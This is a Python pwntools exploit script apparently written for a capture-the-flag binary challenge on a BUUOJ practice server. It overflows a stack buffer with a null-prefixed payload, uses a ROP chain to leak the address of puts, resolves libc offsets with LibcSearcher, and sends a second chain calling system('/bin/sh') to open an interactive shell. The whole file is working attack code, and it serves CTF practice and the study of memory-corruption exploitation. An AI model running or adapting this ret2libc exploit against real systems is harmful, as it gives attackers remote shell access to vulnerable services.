from pwn import * 
from pwn import p64
from LibcSearcher import *

debug = 0
gdb_is = 0
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./pwn")
else:
    host = "node4.buuoj.cn"
    r = connect(host,27623)#远程连接
    gdb_is =0

if gdb_is:
    gdb.attach(r,'b* 0x0400AEE')
    # gdb.attach(r)
    pause()
    pass

elf = ELF('./pwn')

pop_rdi = 0x00400c83
encrypt_addr = 0x4009a0
pop_rsi_r15 = 0x0000400c81
ret_addr = 0x04006b9
r.sendline(b'1')
payload = b'\0'+b'A'* (0x50-1)+ b'junkjunk' + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(encrypt_addr)
r.sendlineafter(b'encrypted',payload)

response = r.recvuntil(b'\x7f')[-6:]
puts_addr = u64(response.ljust(8,b'\x00')) 

libc=LibcSearcher('puts',puts_addr)
offset=puts_addr-libc.dump('puts')
binsh=offset+libc.dump('str_bin_sh')
system=offset+libc.dump('system')

payload = b'\0'+b'A'* (0x50-1)+ b'junkjunk' + p64(pop_rdi) + p64(binsh) +p64(ret_addr)+ p64(system)
r.sendlineafter(b'encrypted',payload)

r.interactive()